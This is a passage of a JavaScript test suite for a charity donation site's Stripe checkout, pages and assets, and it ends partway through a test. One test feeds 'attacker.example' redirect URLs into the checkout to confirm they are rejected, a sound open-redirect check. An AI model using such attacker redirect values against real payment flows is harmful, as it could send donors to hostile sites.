import assert from "node:assert/strict";
import { createHmac } from "node:crypto";
import { readFile as readFileFromDisk } from "node:fs/promises";
import { dirname, resolve } from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";
import { runInNewContext } from "node:vm";

const projectRoot = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const readFile = (relativePath, options) => readFileFromDisk(resolve(projectRoot, relativePath), options);

const importFunctionModule = async (relativePath) => {
  const absolutePath = resolve(projectRoot, relativePath);
  const source = await readFileFromDisk(absolutePath, "utf8");
  const encoded = Buffer.from(source, "utf8").toString("base64");
  return import(`data:text/javascript;base64,${encoded}`);
};

const checkoutModulePaths = [
  "functions/charity/donations/checkout.js",
  "../functions/charity/donations/checkout.js",
];

const callCheckout = async (modulePath, body, env = {}) => {
  const checkout = await importFunctionModule(modulePath);
  const originalFetch = globalThis.fetch;
  let stripeBody = "";
  let stripeCalls = 0;

  globalThis.fetch = async (_url, options) => {
    stripeCalls += 1;
    stripeBody = String(options.body || "");
    return new Response(JSON.stringify({ url: "https://checkout.stripe.test/catalog" }), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  };

  try {
    const response = await checkout.onRequestPost({
      request: new Request("https://pages.example/charity/donations/checkout", {
        method: "POST",
        body: JSON.stringify({
          donor_name: "Catalog Donor",
          donor_email: "catalog@example.com",
          payment_method: "stripe",
          giving_frequency: "one_time",
          ...body,
        }),
      }),
      env: { OWR_STRIPE_SECRET_KEY: "sk_test_mock", ...env },
    });
    const payload = await response.json();
    return {
      response,
      payload,
      stripeCalls,
      stripeForm: new URLSearchParams(stripeBody),
    };
  } finally {
    globalThis.fetch = originalFetch;
  }
};

const createGooglePrivateKey = async () => {
  return crypto.subtle.generateKey(
    {
      name: "RSASSA-PKCS1-v1_5",
      modulusLength: 2048,
      publicExponent: new Uint8Array([1, 0, 1]),
      hash: "SHA-256",
    },
    true,
    ["sign", "verify"]
  ).then(async (keyPair) => {
    const exported = await crypto.subtle.exportKey("pkcs8", keyPair.privateKey);
    const base64 = Buffer.from(exported).toString("base64").match(/.{1,64}/g).join("\n");
    return `-----BEGIN PRIVATE KEY-----\n${base64}\n-----END PRIVATE KEY-----`;
  });
};

test("checkout creates a one-time Stripe session with a $5 minimum and configured redirect URLs", async () => {
  const checkout = await importFunctionModule("functions/charity/donations/checkout.js");
  const originalFetch = globalThis.fetch;
  let stripeBody = "";

  globalThis.fetch = async (_url, options) => {
    stripeBody = String(options.body);
    return new Response(JSON.stringify({ url: "https://checkout.stripe.test/session" }), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  };

  try {
    const request = new Request("https://pages.example/charity/donations/checkout", {
      method: "POST",
      body: JSON.stringify({
        donor_name: "Test Donor",
        donor_email: "donor@example.com",
        amount_usd: 5,
        payment_method: "stripe",
        campaign: "General Fund",
        donor_note: "For orphan support",
        anonymous_public: true,
      }),
    });
    const response = await checkout.onRequestPost({
      request,
      env: {
        OWR_STRIPE_SECRET_KEY: "sk_test_mock",
        OWR_SUCCESS_URL: "https://one-world-relief.org/charity/thank-you",
        OWR_CANCEL_URL: "https://one-world-relief.org/charity/cancelled",
      },
    });
    const payload = await response.json();
    const form = new URLSearchParams(stripeBody);
    const successUrl = new URL(form.get("success_url"));

    assert.equal(response.status, 200);
    assert.equal(payload.redirect_url, "https://checkout.stripe.test/session");
    assert.equal(payload.giving_frequency, "one_time");
    assert.equal(form.get("mode"), "payment");
    assert.equal(form.get("submit_type"), "donate");
    assert.equal(form.get("line_items[0][price_data][unit_amount]"), "500");
    assert.equal(form.get("metadata[giving_frequency]"), "one_time");
    assert.equal(form.get("metadata[recurring_interval]"), "one_time");
    assert.equal(form.get("metadata[schedule_label]"), "One-time donation");
    assert.equal(form.get("payment_intent_data[receipt_email]"), "donor@example.com");
    assert.equal(form.get("metadata[donor_note]"), "For orphan support");
    assert.equal(form.get("metadata[anonymous_public]"), "yes");
    assert.equal(form.get("payment_intent_data[metadata][donor_note]"), "For orphan support");
    assert.equal(form.get("payment_intent_data[metadata][anonymous_public]"), "yes");
    assert.equal(successUrl.origin, "https://one-world-relief.org");
    assert.equal(successUrl.pathname, "/charity/thank-you");
    assert.match(successUrl.searchParams.get("donation_id"), /^[0-9a-f-]+$/);
    assert.equal(successUrl.searchParams.get("session_id"), "{CHECKOUT_SESSION_ID}");
    assert.match(form.get("cancel_url"), /^https:\/\/one-world-relief\.org\/charity\/cancelled/);
    assert.equal(form.has("line_items[0][price_data][recurring][interval]"), false);
    assert.equal(form.has("subscription_data[metadata][giving_frequency]"), false);
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test("checkout ignores body redirect overrides and only accepts trusted HTTPS environment redirects", async () => {
  for (const modulePath of checkoutModulePaths) {
    const requestOriginFallback = await callCheckout(modulePath, {
      program_id: "unrestricted",
      amount_usd: 25,
      success_url: "https://attacker.example/paid",
      cancel_url: "https://attacker.example/cancelled",
    });
    const fallbackSuccess = new URL(requestOriginFallback.stripeForm.get("success_url"));
    const fallbackCancel = new URL(requestOriginFallback.stripeForm.get("cancel_url"));
    assert.equal(fallbackSuccess.origin, "https://pages.example", modulePath);
    assert.equal(fallbackSuccess.pathname, "/charity/thank-you", modulePath);
    assert.equal(fallbackCancel.origin, "https://pages.example", modulePath);
    assert.equal(fallbackCancel.pathname, "/charity/cancelled", modulePath);

    const trustedConfigured = await callCheckout(modulePath, {
      program_id: "unrestricted",
      amount_usd: 25,
      success_url: "https://attacker.example/paid",
      cancel_url: "https://attacker.example/cancelled",
    }, {
      OWR_SUCCESS_URL: "https://one-world-relief.org/charity/thank-you",
      OWR_CANCEL_URL: "https://one-world-relief.org/charity/cancelled",
    });
    assert.equal(new URL(trustedConfigured.stripeForm.get("success_url")).origin, "https://one-world-relief.org", modulePath);
    assert.equal(new URL(trustedConfigured.stripeForm.get("cancel_url")).origin, "https://one-world-relief.org", modulePath);

    const mismatchedConfigured = await callCheckout(modulePath, {
      program_id: "unrestricted",
      amount_usd: 25,
    }, {
      OWR_SUCCESS_URL: "https://one-world-relief.org/charity/thank-you",
      OWR_CANCEL_URL: "https://attacker.example/cancelled",
    });
    assert.equal(new URL(mismatchedConfigured.stripeForm.get("success_url")).origin, "https://pages.example", modulePath);
    assert.equal(new URL(mismatchedConfigured.stripeForm.get("cancel_url")).origin, "https://pages.example", modulePath);

    const insecureConfigured = await callCheckout(modulePath, {
      program_id: "unrestricted",
      amount_usd: 25,
    }, {
      OWR_SUCCESS_URL: "http://one-world-relief.org/charity/thank-you",
      OWR_CANCEL_URL: "http://one-world-relief.org/charity/cancelled",
    });
    assert.equal(new URL(insecureConfigured.stripeForm.get("success_url")).origin, "https://pages.example", modulePath);
    assert.equal(new URL(insecureConfigured.stripeForm.get("cancel_url")).origin, "https://pages.example", modulePath);
  }
});

test("checkout supports Apple Pay through Stripe card wallets", async () => {
  const checkout = await importFunctionModule("functions/charity/donations/checkout.js");
  const originalFetch = globalThis.fetch;
  let stripeBody = "";

  globalThis.fetch = async (_url, options) => {
    stripeBody = String(options.body);
    return new Response(JSON.stringify({ url: "https://checkout.stripe.test/apple-pay" }), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  };

  try {
    const response = await checkout.onRequestPost({
      request: new Request("https://pages.example/charity/donations/checkout", {
        method: "POST",
        body: JSON.stringify({
          donor_name: "Apple Donor",
          donor_email: "apple@example.com",
          amount_usd: 300,
          payment_method: "apple_pay",
          campaign: "Orphan Support",
        }),
      }),
      env: { OWR_STRIPE_SECRET_KEY: "sk_test_mock" },
    });
    const form = new URLSearchParams(stripeBody);

    assert.equal(response.status, 200);
    assert.equal(form.get("payment_method_types[0]"), "card");
    assert.equal(form.get("payment_intent_data[receipt_email]"), "apple@example.com");
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test("checkout supports Cash App Pay through Stripe Checkout", async () => {
  const checkout = await importFunctionModule("functions/charity/donations/checkout.js");
  const originalFetch = globalThis.fetch;
  let stripeBody = "";

  globalThis.fetch = async (_url, options) => {
    stripeBody = String(options.body);
    return new Response(JSON.stringify({ url: "https://checkout.stripe.test/cash-app" }), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  };

  try {
    const response = await checkout.onRequestPost({
      request: new Request("https://pages.example/charity/donations/checkout", {
        method: "POST",
        body: JSON.stringify({
          donor_name: "Cash Donor",
          donor_email: "cash@example.com",
          amount_usd: 100,
          payment_method: "cash_app",
          campaign: "Feeding",
        }),
      }),
      env: { OWR_STRIPE_SECRET_KEY: "sk_test_mock" },
    });
    const form = new URLSearchParams(stripeBody);

    assert.equal(response.status, 200);
    assert.equal(form.get("payment_method_types[0]"), "cashapp");
    assert.equal(form.get("payment_method_types[1]"), "card");
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test("checkout creates monthly recurring Stripe subscriptions", async () => {
  const checkout = await importFunctionModule("functions/charity/donations/checkout.js");
  const originalFetch = globalThis.fetch;
  let stripeBody = "";

  globalThis.fetch = async (_url, options) => {
    stripeBody = String(options.body);
    return new Response(JSON.stringify({ url: "https://checkout.stripe.test/monthly" }), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  };

  try {
    const response = await checkout.onRequestPost({
      request: new Request("https://pages.example/charity/donations/checkout", {
        method: "POST",
        body: JSON.stringify({
          donor_name: "Monthly Donor",
          donor_email: "monthly@example.com",
          amount_usd: 25,
          payment_method: "credit_card",
          campaign: "Orphan Support",
          giving_frequency: "monthly",
        }),
      }),
      env: { OWR_STRIPE_SECRET_KEY: "sk_test_mock" },
    });
    const form = new URLSearchParams(stripeBody);
    const payload = await response.json();

    assert.equal(response.status, 200);
    assert.equal(payload.giving_frequency, "monthly");
    assert.equal(form.get("mode"), "subscription");
    assert.equal(form.get("line_items[0][price_data][recurring][interval]"), "month");
    assert.equal(form.get("payment_method_collection"), "always");
    assert.equal(form.get("metadata[giving_frequency]"), "monthly");
    assert.equal(form.get("subscription_data[metadata][giving_frequency]"), "monthly");
    assert.equal(form.get("subscription_data[metadata][donor_email]"), "monthly@example.com");
    assert.equal(form.has("payment_intent_data[receipt_email]"), false);
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test("checkout anchors weekly Jummah giving to Friday", async () => {
  const checkout = await importFunctionModule("functions/charity/donations/checkout.js");
  const originalFetch = globalThis.fetch;
  let stripeBody = "";

  globalThis.fetch = async (_url, options) => {
    stripeBody = String(options.body);
    return new Response(JSON.stringify({ url: "https://checkout.stripe.test/jummah" }), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  };

  try {
    const response = await checkout.onRequestPost({
      request: new Request("https://pages.example/charity/donations/checkout", {
        method: "POST",
        body: JSON.stringify({
          donor_name: "Friday Donor",
          donor_email: "friday@example.com",
          amount_usd: 10,
          payment_method: "apple_pay",
          campaign: "Feeding",
          giving_frequency: "weekly_jummah",
        }),
      }),
      env: { OWR_STRIPE_SECRET_KEY: "sk_test_mock" },
    });
    const form = new URLSearchParams(stripeBody);
    const anchor = new Date(Number(form.get("subscription_data[billing_cycle_anchor]")) * 1000);

    assert.equal(response.status, 200);
    assert.equal(form.get("mode"), "subscription");
    assert.equal(form.get("payment_method_types[0]"), "card");
    assert.equal(form.get("line_items[0][price_data][recurring][interval]"), "week");
    assert.equal(form.get("subscription_data[proration_behavior]"), "none");
    assert.equal(form.get("metadata[giving_frequency]"), "weekly_jummah");
    assert.equal(form.get("metadata[schedule_label]"), "Weekly Jummah donation");
    assert.equal(anchor.getUTCDay(), 5);
    assert.equal(anchor.getUTCHours(), 17);
    assert.equal(anchor.getUTCMinutes(), 30);
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test("checkout blocks manual payment methods for recurring donations", async () => {
  const checkout = await importFunctionModule("functions/charity/donations/checkout.js");
  const response = await checkout.onRequestPost({
    request: new Request("https://pages.example/charity/donations/checkout", {
      method: "POST",
      body: JSON.stringify({
        donor_name: "Recurring Donor",
        donor_email: "recurring@example.com",
        amount_usd: 10,
        payment_method: "cash_app",
        campaign: "General Fund",
        giving_frequency: "monthly",
      }),
    }),
    env: { OWR_STRIPE_SECRET_KEY: "sk_test_mock" },
  });
  const payload = await response.json();

  assert.equal(response.status, 400);
  assert.match(payload.detail, /Recurring donations use Stripe card checkout/);
});

test("checkout redirects Venmo only when a Venmo URL is configured", async () => {
  const checkout = await importFunctionModule("functions/charity/donations/checkout.js");
  const requestBody = {
    donor_name: "Venmo Donor",
    donor_email: "venmo@example.com",
    amount_usd: 350,
    payment_method: "venmo",
    campaign: "Wells",
  };

  const missingResponse = await checkout.onRequestPost({
    request: new Request("https://pages.example/charity/donations/checkout", {
      method: "POST",
      body: JSON.stringify(requestBody),
    }),
    env: { OWR_STRIPE_SECRET_KEY: "sk_test_mock" },
  });
  assert.equal(missingResponse.status, 503);

  const configuredResponse = await checkout.onRequestPost({
    request: new Request("https://pages.example/charity/donations/checkout", {
      method: "POST",
      body: JSON.stringify(requestBody),
    }),
    env: {
      OWR_STRIPE_SECRET_KEY: "sk_test_mock",
      OWR_VENMO_URL: "https://account.venmo.com/u/oneworldrelief",
    },
  });
  const payload = await configuredResponse.json();
  const redirect = new URL(payload.redirect_url);

  assert.equal(configuredResponse.status, 200);
  assert.equal(payload.provider, "venmo");
  assert.equal(redirect.hostname, "account.venmo.com");
  assert.equal(redirect.searchParams.get("amount"), "350.00");
  assert.match(redirect.searchParams.get("note"), /One World Relief - Water Support/);
});

test("thank-you page renders polished animated donation thanks", async () => {
  const thankYou = await importFunctionModule("functions/charity/thank-you.js");
  const response = await thankYou.onRequestGet({
    request: new Request("https://one-world-relief.org/charity/thank-you?donation_id=don_123&session_id=cs_test_123"),
    env: { OWR_STRIPE_SECRET_KEY: "sk_test_mock" },
  });
  const html = await response.text();

  assert.equal(response.status, 200);
  assert.match(html, /Thank you for your Donation/);
  assert.match(html, /success-card/);
  assert.match(html, /check-wrap/);
  assert.match(html, /draw-check/);
  assert.doesNotMatch(html, /coin-gift/);
  assert.doesNotMatch(html, /story-scene/);
  assert.doesNotMatch(html, /class="person child"/);
  assert.doesNotMatch(html, /success-orbit/);
  assert.doesNotMatch(html, /Donation Receipt/);
  assert.doesNotMatch(html, /Receipt ID/);
});

test("share QR points donors to the .org donation domain", async () => {
  const [shareHtml, siteJs, qrSvg] = await Promise.all([
    readFile("share.html", "utf8"),
    readFile("one-world-relief.js", "utf8"),
    readFile("assets/one-world-relief-donate-qr.svg", "utf8"),
  ]);

  assert.match(shareHtml, /one-world-relief\.org\/donate/);
  assert.match(shareHtml, /facebook\.com\/sharer\/sharer\.php\?u=https%3A%2F%2Fone-world-relief\.org%2Fdonate/);
  assert.match(shareHtml, /twitter\.com\/intent\/tweet\?url=https%3A%2F%2Fone-world-relief\.org%2Fdonate/);
  assert.match(shareHtml, /wa\.me\/\?text=Donate%20to%20One%20World%20Relief%3A%20https%3A%2F%2Fone-world-relief\.org%2Fdonate/);
  assert.match(shareHtml, /sms:\?body=Donate%20to%20One%20World%20Relief%3A%20https%3A%2F%2Fone-world-relief\.org%2Fdonate/);
  assert.match(shareHtml, /href="assets\/one-world-relief-donate-qr\.svg" download/);
  assert.match(shareHtml, /id="copyInstagramCaption"/);
  assert.match(shareHtml, /id="nativeShareButton"/);
  assert.match(shareHtml, /id="openQrPresentation"/);
  assert.match(shareHtml, /social-share-actions/);
  assert.match(shareHtml, /share-pill-facebook/);
  assert.match(shareHtml, /share-pill-instagram/);
  assert.match(shareHtml, /share-pill-whatsapp/);
  assert.match(shareHtml, /id="instagramShareStatus"/);
  assert.doesNotMatch(shareHtml, /class="share-icon"/);
  assert.match(siteJs, /https:\/\/one-world-relief\.org\/donate/);
  assert.match(siteJs, /https:\/\/www\.instagram\.com\//);
  assert.match(siteJs, /navigator\.share/);
  assert.match(siteJs, /copyInstagramCaption/);
  assert.match(qrSvg, /stroke="#183447"/);
  assert.doesNotMatch(shareHtml, /one-world-relief\.com\/donate/);
  assert.doesNotMatch(siteJs, /one-world-relief\.com\/donate/);
  assert.doesNotMatch(shareHtml, /<span class="share-icon"/);
});

test("donation page leads with unrestricted $5 giving and purpose-specific amount rules", async () => {
  const [donateHtml, checkoutJs, programSource, siteCss, deployedCheckoutSource, mirrorCheckoutSource] = await Promise.all([
    readFile("donate.html", "utf8"),
    readFile("donation-checkout.js", "utf8"),
    readFile("donation-programs.js", "utf8"),
    readFile("one-world-relief.css", "utf8"),
    readFile("functions/charity/donations/checkout.js", "utf8"),
    readFile("../functions/charity/donations/checkout.js", "utf8"),
  ]);

  const donationForm = donateHtml.match(/<form id="donationForm"[^>]*>[\s\S]*?<\/form>/)?.[0];
  assert.ok(donationForm, "donate page should contain the checkout form");
  const presetAmounts = [...donationForm.matchAll(/name="amount" value="([^"]+)"/g)].map((match) => match[1]);
  assert.deepEqual(presetAmounts, ["5", "25", "50", "100"]);
  assert.equal([...donationForm.matchAll(/name="amount"[^>]*checked/g)].length, 1);
  assert.match(donationForm, /name="amount" value="25" checked/);
  assert.doesNotMatch(donationForm, /name="amount" value="custom"/);

  const customAmountInput = donationForm.match(/<input id="customDonation"[^>]*>/)?.[0];
  assert.ok(customAmountInput, "custom amount should always be visible");
  assert.match(customAmountInput, /type="number"/);
  assert.match(customAmountInput, /min="5"/);
  assert.match(customAmountInput, /step="1"/);
  assert.match(customAmountInput, /inputmode="numeric"/);
  assert.match(customAmountInput, /aria-describedby="minimumDonationText"/);
  assert.doesNotMatch(customAmountInput, /hidden/);
  assert.match(donationForm, /id="minimumDonationText">Minimum donation is \$5\.<\/p>/);
  assert.match(donationForm, /data-program-checkout="true"/);
  assert.match(donationForm, /id="selectedProgramId" type="hidden" value="unrestricted"/);
  assert.match(donationForm, /id="selectedProgramVariant" type="hidden"/);
  assert.match(donationForm, /id="donationReferrerCase" type="hidden"/);
  assert.match(donationForm, /id="selectedProgramTitle">Give Where It.s Needed Most<\/h3>/);
  assert.match(donationForm, /id="selectedProgramAmount">Any amount from \$5<\/strong>/);
  assert.match(donationForm, /<select id="campaignSelect" required>[\s\S]*?<option value="unrestricted">Where it's needed most<\/option>/);
  assert.doesNotMatch(donationForm, /givingFrequencySelect|name="givingFrequency"|recurringDonationNote/);
  assert.doesNotMatch(donationForm, /id="paymentMethod"|donation-step-payment|aria-label="Supported payment methods"|class="payments"/);
  assert.doesNotMatch(donationForm, /Apple Pay|Cash App Pay|Mastercard|Venmo|Monthly recurring|Every Friday/);

  const donorNameInput = donationForm.match(/<input id="donorName"[^>]*>/)?.[0];
  const donorEmailInput = donationForm.match(/<input id="donorEmail"[^>]*>/)?.[0];
  assert.ok(donorNameInput);
  assert.ok(donorEmailInput);
  assert.match(donorNameInput, /name="name"/);
  assert.match(donorNameInput, /autocomplete="name"/);
  assert.match(donorNameInput, /required/);
  assert.match(donorEmailInput, /name="email"/);
  assert.match(donorEmailInput, /type="email"/);
  assert.match(donorEmailInput, /autocomplete="email"/);
  assert.match(donorEmailInput, /required/);
  assert.match(donationForm, /Note for One World Relief <span>optional<\/span>/);
  assert.match(donationForm, /<textarea id="donorNote"[^>]*maxlength="180"[^>]*placeholder="Add a short note or dedication"><\/textarea>/);
  assert.doesNotMatch(donationForm.match(/<textarea id="donorNote"[^>]*>/)?.[0] || "", /required/);
  assert.match(donationForm, /id="anonymousDonation"/);
  assert.match(donationForm, /Continue to secure checkout/);
  assert.match(donationForm, /Stripe securely handles your payment\. One World Relief never receives your card details\./);

  assert.match(donateHtml, /<script src="donation-programs\.js"><\/script>[\s\S]*?<script src="donation-checkout\.js"><\/script>/);
  assert.match(checkoutJs, /const getAmountRule = \(program, variant\) =>/);
  assert.match(checkoutJs, /if \(rule\.type === "fixed"\)/);
  assert.match(checkoutJs, /if \(rule\.type === "range"\)/);
  assert.match(checkoutJs, /return amount >= rule\.min/);
  assert.match(checkoutJs, /program_id: program\.id/);
  assert.match(checkoutJs, /program_variant: variant\?\.id \|\| ""/);
  assert.match(checkoutJs, /referrer_case: referrerInput\?\.value \|\| ""/);
  assert.match(checkoutJs, /campaign: program\.campaign/);
  assert.match(checkoutJs, /payment_method: "stripe"/);
  assert.match(checkoutJs, /giving_frequency: "one_time"/);
  assert.match(checkoutJs, /donor_note: donorNote/);
  assert.match(checkoutJs, /anonymous_public: anonymous/);
  assert.doesNotMatch(checkoutJs, /givingFrequencySelect|paymentMethodSelect|syncRecurringPaymentAvailability|recurringBlockedMethods/);

  assert.match(siteCss, /\.donation-form-card \.custom-donation-input-wrap/);
  assert.match(siteCss, /\.donation-trust-note/);
  const donationFormCardRules = [...siteCss.matchAll(/\.donation-form-card\s*\{([^}]*)\}/g)].map((match) => match[1]);
  assert.ok(donationFormCardRules.some((rule) => /animation: none/.test(rule)), "checkout card should not keep the old decorative animation");

  for (const [label, source] of [
    ["deployed checkout", deployedCheckoutSource],
    ["root mirror checkout", mirrorCheckoutSource],
  ]) {
    assert.match(source, /!Number\.isFinite\(amountUsd\) \|\| amountUsd < 5/, `${label} should enforce $5 in code`);
    assert.match(source, /Donation amount must be at least \$5\./, `${label} should explain the minimum`);
  }

  const catalogContext = { window: {} };
  runInNewContext(programSource, catalogContext);
  const programs = JSON.parse(JSON.stringify(catalogContext.window.ONE_WORLD_RELIEF_DONATION_PROGRAMS));
  const summarizeRule = (id) => {
    const program = programs.find((item) => item.id === id);
    assert.ok(program, `${id} should be in the public catalog`);
    return {
      rule: program.amountRule,
      min: program.minAmount,
      max: program.maxAmount ?? null,
      defaultAmount: program.defaultAmount,
    };
  };
  assert.equal(programs.length, 8);
  assert.deepEqual(summarizeRule("unrestricted"), { rule: "minimum", min: 5, max: null, defaultAmount: 25 });
  assert.deepEqual(summarizeRule("orphan_annual"), { rule: "fixed", min: 300, max: 300, defaultAmount: 300 });
  assert.deepEqual(summarizeRule("mosque_build"), { rule: "fixed", min: 1000, max: 1000, defaultAmount: 1000 });
  assert.deepEqual(summarizeRule("water_support"), { rule: "range", min: 350, max: 3000, defaultAmount: 350 });
  assert.deepEqual(summarizeRule("orphan_feeding"), { rule: "minimum", min: 100, max: null, defaultAmount: 100 });
  assert.deepEqual(summarizeRule("family_recovery"), { rule: "fixed", min: 600, max: 600, defaultAmount: 600 });
  assert.deepEqual(summarizeRule("emergency_aid"), { rule: "minimum", min: 25, max: null, defaultAmount: 25 });
  assert.deepEqual(summarizeRule("zakat"), { rule: "minimum", min: 5, max: null, defaultAmount: 25 });

  const water = programs.find((program) => program.id === "water_support");
  assert.deepEqual(
    water.variants.map(({ id, amount }) => ({ id, amount })),
    [
      { id: "water_station", amount: 350 },
      { id: "water_contribution", amount: 1000 },
      { id: "community_well", amount: 3000 },
    ],
  );

  for (const modulePath of [
    "functions/charity/donations/checkout.js",
    "../functions/charity/donations/checkout.js",
  ]) {
    const checkout = await importFunctionModule(modulePath);
    const response = await checkout.onRequestPost({
      request: new Request("https://pages.example/charity/donations/checkout", {
        method: "POST",
        body: JSON.stringify({
          donor_name: "Minimum Test",
          donor_email: "minimum@example.com",
          amount_usd: 4.99,
          payment_method: "stripe",
          campaign: "General Fund",
          giving_frequency: "one_time",
        }),
      }),
      env: { OWR_STRIPE_SECRET_KEY: "sk_test_mock" },
    });
    const payload = await response.json();
    assert.equal(response.status, 400, `${modulePath} should reject donations below $5`);
    assert.equal(payload.detail, "Donation amount must be at least $5.");
  }
});

test("donation catalog renders approved real-photo cards in responsive 3-2-1 columns", async () => {
  const [programSource, checkoutJs, siteCss] = await Promise.all([
    readFile("donation-programs.js", "utf8"),
    readFile("donation-checkout.js", "utf8"),
    readFile("one-world-relief.css", "utf8"),
  ]);
  const context = { window: {} };
  runInNewContext(programSource, context);
  const programs = JSON.parse(JSON.stringify(context.window.ONE_WORLD_RELIEF_DONATION_PROGRAMS));
  const featured = programs.filter((program) => program.featured === true);

  assert.equal(featured.length, 6);
  assert.deepEqual(featured.map((program) => program.id), [
    "orphan_annual",
    "mosque_build",
    "water_support",
    "orphan_feeding",
    "family_recovery",
    "emergency_aid",
  ]);
  assert.match(checkoutJs, /programs\.filter\(\(program\) => program\.featured === true\)\.forEach/);
  assert.match(checkoutJs, /card\.className = "donation-program-card"/);
  assert.match(checkoutJs, /image\.src = program\.imageUrl/);
  assert.match(checkoutJs, /caption\.textContent = program\.photoContext/);

  for (const program of featured) {
    assert.match(program.imageUrl, /^assets\/projects\/case-\d{3}\/[a-z0-9-]+\.jpg$/);
    assert.match(program.photoContext, /Photo|photo/);
    assert.ok(program.imageAlt.length > 20);
    const photo = await readFile(program.imageUrl);
    assert.ok(photo.byteLength > 50_000, `${program.id} should use a usable real project photo`);
    assert.deepEqual([...photo.subarray(0, 3)], [0xff, 0xd8, 0xff], `${program.id} photo should be a JPEG`);
  }

  assert.match(siteCss, /\.donation-program-grid\s*\{[^}]*grid-template-columns: repeat\(3, minmax\(0, 1fr\)\)/);
  assert.match(siteCss, /@media \(max-width: 980px\)[\s\S]*?\.donation-program-grid\s*\{[^}]*grid-template-columns: repeat\(2, minmax\(0, 1fr\)\)/);
  assert.match(siteCss, /@media \(max-width: 720px\)[\s\S]*?\.donation-program-grid\s*\{[^}]*grid-template-columns: 1fr/);
  const catalogRules = siteCss.slice(siteCss.indexOf(".donation-program-grid {"), siteCss.indexOf(".donation-program-action {"));
  assert.doesNotMatch(catalogRules, /animation\s*:/);
});

test("donation page renders a static real-photo Case 004-006 collage beside checkout", async () => {
  const [donateHtml, siteJs, siteCss] = await Promise.all([
    readFile("donate.html", "utf8"),
    readFile("one-world-relief.js", "utf8"),
    readFile("one-world-relief.css", "utf8"),
  ]);

  assert.match(donateHtml, /<section class="donate-impact-panel" aria-labelledby="donateImpactTitle">/);
  assert.match(donateHtml, /Real project photos/);
  assert.match(donateHtml, /Your gift joins work you can see\./);
  assert.match(donateHtml, /documented costs, field photos, and completed work/);
  assert.match(donateHtml, /<div class="donate-impact-media" aria-label="Documented One World Relief projects">/);
  assert.ok(donateHtml.indexOf('class="donate-impact-panel"') < donateHtml.indexOf('class="donation-card donation-form-card'));

  const collageProjects = [
    {
      caseId: "004",
      href: "projects/case-004.html",
      image: "assets/projects/case-004/korbani-meals-004-main.jpg",
      copy: /Feeding Madrasa for Orphan Kids[\s\S]*?\$400 delivered/,
    },
    {
      caseId: "005",
      href: "projects/case-005.html",
      image: "assets/projects/case-005/flood-relief-005-child-delivery.jpg",
      copy: /\$450 flood relief delivered/,
    },
    {
      caseId: "006",
      href: "projects/case-006.html",
      image: "assets/projects/case-006/mosque-gate-006-main.jpg",
      copy: /\$170 mosque gate completed/,
    },
  ];

  for (const project of collageProjects) {
    assert.match(donateHtml, new RegExp(`href="${project.href.replaceAll(".", "\\.")}"[\\s\\S]*?src="${project.image.replaceAll(".", "\\.")}"`));
    assert.match(donateHtml, new RegExp(`Case ${project.caseId}`));
    assert.match(donateHtml, project.copy);
    const image = await readFile(project.image);
    assert.ok(image.byteLength > 50_000, `${project.image} should be a usable real project photo`);
    assert.deepEqual([...image.subarray(0, 3)], [0xff, 0xd8, 0xff], `${project.image} should be a JPEG`);
  }

  assert.match(donateHtml, /See every documented project/);
  assert.doesNotMatch(donateHtml, /id="donateProjectFlow"|donate-project-track|payment-rail/);
  assert.doesNotMatch(siteJs, /donateProjectFlow|renderDonateProjectFlow/);
  assert.match(siteCss, /\.donate-impact-media\s*\{[\s\S]*?grid-template-columns: repeat\(2, minmax\(0, 1fr\)\)/);
  assert.match(siteCss, /\.donate-impact-photo-main\s*\{[\s\S]*?grid-column: 1 \/ -1/);
  const staticCollageCss = siteCss.slice(
    siteCss.indexOf(".donate-impact-media {"),
    siteCss.indexOf(".donate-impact-link {"),
  );
  assert.doesNotMatch(staticCollageCss, /animation\s*:/);
});

test(".com host redirects to .org", async () => {
  const middleware = await importFunctionModule("functions/_middleware.js");
  const response = await middleware.onRequest({
    request: new Request("https://one-world-relief.com/donate?amount=25"),
    next: async () => new Response("next"),
  });

  assert.equal(response.status, 301);
  assert.equal(response.headers.get("location"), "https://one-world-relief.org/donate?amount=25");
});

test("pages include the supplied One World Relief logo and install icons", async () => {
  const rootPageNames = ["index.html", "about.html", "contact.html", "donate.html", "projects.html", "share.html"];
  const projectPageNames = Array.from({ length: 9 }, (_, index) => `projects/case-${String(index + 1).padStart(3, "0")}.html`);
  const [rootPages, projectPages, offlineHtml, faviconPng, brandIcon, brandIconSmall, appleTouchIcon, webManifest, serviceWorker] = await Promise.all([
    Promise.all(rootPageNames.map((name) => readFile(name, "utf8"))),
    Promise.all(projectPageNames.map((name) => readFile(name, "utf8"))),
    readFile("offline.html", "utf8"),
    readFile("favicon.png"),
    readFile("assets/one-world-relief-icon.png"),
    readFile("assets/one-world-relief-icon-192.png"),
    readFile("apple-touch-icon.png"),
    readFile("site.webmanifest", "utf8"),
    readFile("sw.js", "utf8"),
  ]);

  for (const page of rootPages) {
    assert.match(page, /<link rel="icon" href="favicon\.png" type="image\/png" \/>/);
    assert.match(page, /<link rel="apple-touch-icon" href="apple-touch-icon\.png" \/>/);
    assert.match(page, /<link rel="manifest" href="site\.webmanifest" \/>/);
    assert.match(page, /<img src="assets\/one-world-relief-icon-192\.png" alt="" \/>/);
  }
  for (const page of projectPages) {
    assert.match(page, /<link rel="icon" href="\.\.\/favicon\.png" type="image\/png" \/>/);
    assert.match(page, /<link rel="apple-touch-icon" href="\.\.\/apple-touch-icon\.png" \/>/);
    assert.match(page, /<link rel="manifest" href="\.\.\/site\.webmanifest" \/>/);
    assert.match(page, /<img src="\.\.\/assets\/one-world-relief-icon-192\.png" alt="" \/>/);
  }
  assert.match(offlineHtml, /<link rel="icon" href="favicon\.png" type="image\/png" \/>/);
  for (const [label, image] of [["favicon", faviconPng], ["brand icon", brandIcon], ["small brand icon", brandIconSmall], ["Apple touch icon", appleTouchIcon]]) {
